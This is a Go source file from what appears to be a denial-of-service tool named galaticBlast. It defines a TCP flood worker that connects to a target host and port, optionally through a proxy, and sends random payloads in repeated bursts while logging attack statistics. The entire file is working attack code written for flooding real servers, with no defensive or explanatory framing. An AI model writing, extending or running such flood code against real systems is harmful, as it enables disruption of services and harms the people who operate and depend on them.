package tcp

import (
	"context"
	crand "crypto/rand"
	"math/rand"

	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/netutil"
)

type FloodWorker struct{}

func NewFloodWorker() *FloodWorker {
	return &FloodWorker{}
}

func (w *FloodWorker) Fire(ctx context.Context, params engine.AttackParams, proxy engine.Proxy, userAgent string, logCh chan<- engine.AttackStats) error {
	conn, err := netutil.DialedTCPClient(params.TargetNode.Scheme, params.TargetNode.Host, params.TargetNode.Port, proxy)
	if err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "tcp connect failed: "+err.Error())
		return nil
	}
	defer conn.Close()

	payload := make([]byte, params.PacketSize)
	if _, err := crand.Read(payload); err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "tcp random generation failed: "+err.Error())
		return nil
	}

	if _, err := conn.Write(payload); err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "tcp write failed: "+err.Error())
		return nil
	}

	bursts := rand.Intn(3) + 1
	for i := 0; i < bursts; i++ {
		payload = make([]byte, params.PacketSize)
		crand.Read(payload)
		if _, err := conn.Write(payload); err != nil {
			break
		}
	}

	engine.SendAttackLogIfVerbose(params.Verbose, logCh, "tcp packet sent successfully")
	return nil
}
